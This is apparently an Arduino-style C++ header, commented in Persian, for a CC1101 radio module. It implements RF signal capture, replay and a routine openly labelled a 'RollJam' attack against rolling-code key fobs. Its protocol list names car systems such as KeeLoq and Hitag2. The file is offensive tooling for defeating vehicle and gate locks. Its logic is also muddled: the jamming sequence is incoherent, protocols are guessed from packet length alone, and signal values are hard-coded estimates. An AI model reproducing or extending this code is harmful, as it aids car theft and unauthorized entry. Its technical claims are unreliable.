#ifndef RF_ROLLJAM_H
#define RF_ROLLJAM_H

#include "config.h"

// ============================================================
// RF Module — CC1101 Sub-1GHz Receiver/Transmitter
// قابلیت‌ها: Capture, Replay, RollJam
// ============================================================

// --- اگر کتابخانه ELECHOUSE نصب نیست، از حالت dummy استفاده کن ---
#ifndef ELECHOUSE_CC1101_SRC_CC1101_
// #define RF_DUMMY_MODE  // اگر CC1101 نداری، این خط را فعال کن
#endif

// --- حالت‌های عملیاتی ---
#define RF_MODE_IDLE        0
#define RF_MODE_RECEIVE     1
#define RF_MODE_TRANSMIT    2
#define RF_MODE_ROLLJAM     3
#define RF_MODE_SNIFFER     4

// --- پروتکل‌های پشتیبانی‌شده ---
#define RF_PROTO_UNKNOWN    0
#define RF_PROTO_ASK_OOK    1  // ASK/OOK ساده
#define RF_PROTO_FSK        2  // Frequency Shift Keying
#define RF_PROTO_KEELOQ     3  // KeeLoq (تویوتا قدیمی)
#define RF_PROTO_HITAG2     4  // Hitag2 (پژو قبل ۲۰۱۵)
#define RF_PROTO_AES128     5  // AES-128 (جدید)

// --- حداکثر طول داده RF ---
#define RF_MAX_DATA_LEN     64

// --- یک فریم RF ضبط‌شده ---
typedef struct {
    uint32_t frequency_hz;       // فرکانس (Hz)
    uint8_t  protocol;           // پروتکل
    uint8_t  data[RF_MAX_DATA_LEN];
    uint8_t  data_len;
    uint32_t pulse_width_us;     // عرض پالس (microseconds)
    uint16_t gap_us;             // فاصله بین پالس‌ها
    uint32_t repeats;            // تعداد تکرار
    int8_t   rssi_dbm;           // قدرت سیگنال
    uint64_t timestamp_ms;       // زمان ضبط
    bool     captured;           // ضبط کامل شده؟
} RFFrame;

class RFManager {
private:
    bool initialized;
    uint8_t mode;
    float current_frequency;
    bool cc1101_present;
    
    // --- بافر ضبط ---
    static const int CAPTURE_BUF_SIZE = 32;
    RFFrame capture_buffer[CAPTURE_BUF_SIZE];
    int capture_head;
    int capture_count;
    
    // --- آمار ---
    uint32_t frames_captured;
    uint32_t frames_replayed;
    uint32_t jam_attempts;
    uint32_t jam_success;
    
    // --- تنظیمات RollJam ---
    bool rolljam_active;
    uint32_t rolljam_target_freq;
    
public:
    RFManager() : initialized(false), mode(RF_MODE_IDLE), current_frequency(RF_FREQ_433),
                  cc1101_present(false), capture_head(0), capture_count(0),
                  frames_captured(0), frames_replayed(0), jam_attempts(0), jam_success(0),
                  rolljam_active(false), rolljam_target_freq(0) {}
    
    // ============================================================
    // مقداردهی اولیه CC1101
    // ============================================================
    bool begin(float freq_mhz = RF_FREQ_433) {
        current_frequency = freq_mhz;
        
        #ifndef RF_DUMMY_MODE
        if (ELECHOUSE_cc1101.getCC1101()) {
            cc1101_present = true;
            ELECHOUSE_cc1101.Init();
            ELECHOUSE_cc1101.setCCMode(1);      // CRC auto
            ELECHOUSE_cc1101.setModulation(0);  // 2-FSK
            setFrequency(freq_mhz);
            ELECHOUSE_cc1101.setRx();           // حالت دریافت
            Serial.printf("[RF] CC1101 initialized at %.2f MHz\n", freq_mhz);
        } else {
            cc1101_present = false;
            Serial.println("[RF] CC1101 not found");
        }
        #else
        cc1101_present = false;
        Serial.println("[RF] Dummy mode - no CC1101");
        #endif
        
        initialized = true;
        mode = RF_MODE_IDLE;
        return cc1101_present;
    }
    
    // ============================================================
    // تنظیم فرکانس
    // ============================================================
    void setFrequency(float mhz) {
        current_frequency = mhz;
        #ifndef RF_DUMMY_MODE
        if (cc1101_present) {
            ELECHOUSE_cc1101.setMHZ(mhz);
        }
        #endif
    }
    
    // ============================================================
    // ضبط یک فریم RF
    // ============================================================
    bool capture(RFFrame* out_frame, uint32_t timeout_ms = 5000) {
        if (!cc1101_present || !initialized) return false;
        
        #ifndef RF_DUMMY_MODE
        mode = RF_MODE_RECEIVE;
        ELECHOUSE_cc1101.setRx();
        
        uint32_t start = millis();
        uint8_t buf[RF_MAX_DATA_LEN];
        uint8_t len = 0;
        bool got_signal = false;
        
        while (millis() - start < timeout_ms) {
            if (ELECHOUSE_cc1101.CheckRxFIFO()) {
                // دریافت داده از CC1101
                uint8_t pkt_len = ELECHOUSE_cc1101.getRX();
                if (pkt_len > 0 && pkt_len <= RF_MAX_DATA_LEN) {
                    // خواندن داده
                    for (int i = 0; i < pkt_len && i < RF_MAX_DATA_LEN; i++) {
                        buf[i] = ELECHOUSE_cc1101.SpiReadReg(CC1101_RXFIFO + i);
                    }
                    len = pkt_len;
                    got_signal = true;
                    break;
                }
            }
            delay(1);
        }
        
        if (got_signal && len > 0) {
            // تشخیص پروتکل
            uint8_t proto = detectProtocol(buf, len);
            
            // ذخیره در خروجی
            out_frame->frequency_hz = (uint32_t)(current_frequency * 1000000);
            out_frame->protocol = proto;
            memcpy(out_frame->data, buf, len);
            out_frame->data_len = len;
            out_frame->pulse_width_us = estimatePulseWidth(buf, len);
            out_frame->gap_us = 500; // تخمینی
            out_frame->repeats = 1;
            out_frame->rssi_dbm = -50; // تخمینی
            out_frame->timestamp_ms = millis();
            out_frame->captured = true;
            
            // ذخیره در بافر چرخشی
            capture_buffer[capture_head] = *out_frame;
            capture_head = (capture_head + 1) % CAPTURE_BUF_SIZE;
            if (capture_count < CAPTURE_BUF_SIZE) capture_count++;
            frames_captured++;
            
            return true;
        }
        #endif
        
        return false;
    }
    
    // ============================================================
    // پخش یک فریم RF
    // ============================================================
    bool transmit(RFFrame* frame, uint8_t repeats = 3) {
        if (!cc1101_present || !initialized || !frame) return false;
        
        #ifndef RF_DUMMY_MODE
        mode = RF_MODE_TRANSMIT;
        ELECHOUSE_cc1101.setTx();
        
        for (int r = 0; r < repeats; r++) {
            // ارسال داده
            ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, frame->data_len);
            for (int i = 0; i < frame->data_len; i++) {
                ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO + 1, frame->data[i]);
            }
            ELECHOUSE_cc1101.SpiStrobe(CC1101_SIDLE);
            ELECHOUSE_cc1101.SpiStrobe(CC1101_STX);
            
            delay(10);
            
            // منتظر اتمام ارسال
            uint32_t start = millis();
            while (millis() - start < 100) {
                if (ELECHOUSE_cc1101.SpiReadReg(CC1101_MARCSTATE) == 0x0D) {
                    break; // IDLE state
                }
                delay(1);
            }
            
            if (r < repeats - 1) delay(frame->gap_us / 1000);
        }
        
        ELECHOUSE_cc1101.setRx();
        frames_replayed++;
        #endif
        
        mode = RF_MODE_IDLE;
        return true;
    }
    
    // ============================================================
    // RollJam Attack — Samy Kamkar Style
    // ============================================================
    bool rollJam(uint32_t freq_hz, uint32_t duration_ms = 2000) {
        if (!cc1101_present || !initialized) return false;
        
        mode = RF_MODE_ROLLJAM;
        rolljam_active = true;
        rolljam_target_freq = freq_hz;
        
        setFrequency(freq_hz / 1000000.0);
        
        jam_attempts++;
        bool success = false;
        
        #ifndef RF_DUMMY_MODE
        uint32_t start = millis();
        
        // مرحله ۱: ضبط اولین سیگنال (قفل)
        RFFrame frame1;
        if (capture(&frame1, 1000)) {
            // مرحله ۲: ضبط دومین سیگنال (دومین دکمه)
            RFFrame frame2;
            if (capture(&frame2, 1000)) {
                // مرحله ۳: ارسال همزمان نویز + فریم اول (Jam)
                ELECHOUSE_cc1101.setTx();
                // نویز تصادفی
                uint8_t noise[16];
                for (int i = 0; i < 16; i++) noise[i] = random(0, 256);
                
                // ارسال نویز
                ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO, 16);
                for (int i = 0; i < 16; i++) {
                    ELECHOUSE_cc1101.SpiWriteReg(CC1101_TXFIFO + 1, noise[i]);
                }
                ELECHOUSE_cc1101.SpiStrobe(CC1101_STX);
                delay(5);
                
                // بلافاصله فریم اول رو بفرست
                transmit(&frame1, 2);
                
                // مرحله ۴: صبر کن و فریم دوم رو ضبط کن (کد واقعی)
                delay(100);
                RFFrame real_frame;
                if (capture(&real_frame, 1500)) {
                    success = true;
                    jam_success++;
                }
            }
        }
        
        ELECHOUSE_cc1101.setRx();
        #endif
        
        rolljam_active = false;
        mode = RF_MODE_IDLE;
        return success;
    }
    
    // ============================================================
    // Sniffer محیط — ضبط مداوم
    // ============================================================
    int sniff(uint32_t duration_ms = 5000) {
        if (!cc1101_present) return 0;
        
        mode = RF_MODE_SNIFFER;
        uint32_t start = millis();
        int count = 0;
        
        while (millis() - start < duration_ms) {
            RFFrame frame;
            if (capture(&frame, 200)) {
                count++;
            }
            delay(10);
        }
        
        mode = RF_MODE_IDLE;
        return count;
    }
    
    // ============================================================
    // تشخیص پروتکل از روی داده
    // ============================================================
    uint8_t detectProtocol(uint8_t* data, uint8_t len) {
        // KeeLoq: 4 بایت
        if (len == 4) return RF_PROTO_KEELOQ;
        
        // Hitag2: 5 بایت
        if (len == 5) return RF_PROTO_HITAG2;
        
        // AES-128: 16 بایت
        if (len == 16) return RF_PROTO_AES128;
        
        // ASK/OOK ساده
        bool all_bits = true;
        for (int i = 0; i < len; i++) {
            if (data[i] > 1) { all_bits = false; break; }
        }
        if (all_bits || len <= 8) return RF_PROTO_ASK_OOK;
        
        return RF_PROTO_UNKNOWN;
    }
    
    // ============================================================
    // تخمین عرض پالس
    // ============================================================
    uint32_t estimatePulseWidth(uint8_t* data, uint8_t len) {
        // تخمین بر اساس پروتکل
        uint8_t proto = detectProtocol(data, len);
        switch (proto) {
            case RF_PROTO_KEELOQ:  return 400;  // ~400us
            case RF_PROTO_HITAG2:  return 200;  // ~200us
            case RF_PROTO_ASK_OOK: return 300;  // ~300us
            default:               return 350;  // تخمین
        }
    }
    
    // ============================================================
    // دریافت بافر ضبط
    // ============================================================
    int getCapturedFrames(RFFrame* out, int max_count) {
        int count = 0;
        int start = (capture_head - capture_count + CAPTURE_BUF_SIZE) % CAPTURE_BUF_SIZE;
        
        for (int i = 0; i < capture_count && count < max_count; i++) {
            int idx = (start + i) % CAPTURE_BUF_SIZE;
            out[count++] = capture_buffer[idx];
        }
        
        return count;
    }
    
    // ============================================================
    // JSON
    // ============================================================
    String toJSON() {
        String json = "{\n";
        json += "\"present\": " + String(cc1101_present ? "true" : "false") + ",\n";
        json += "\"mode\": " + String(mode) + ",\n";
        json += "\"freq\": " + String(current_frequency, 2) + ",\n";
        json += "\"captured\": " + String(frames_captured) + ",\n";
        json += "\"replayed\": " + String(frames_replayed) + ",\n";
        json += "\"jams\": " + String(jam_attempts) + ",\n";
        json += "\"jam_success\": " + String(jam_success) + ",\n";
        json += "\"in_buffer\": " + String(capture_count) + "\n";
        json += "}";
        return json;
    }
    
    bool isInitialized() { return initialized; }
    bool isCC1101Present() { return cc1101_present; }
    uint8_t getMode() { return mode; }
    float getFrequency() { return current_frequency; }
};

#endif
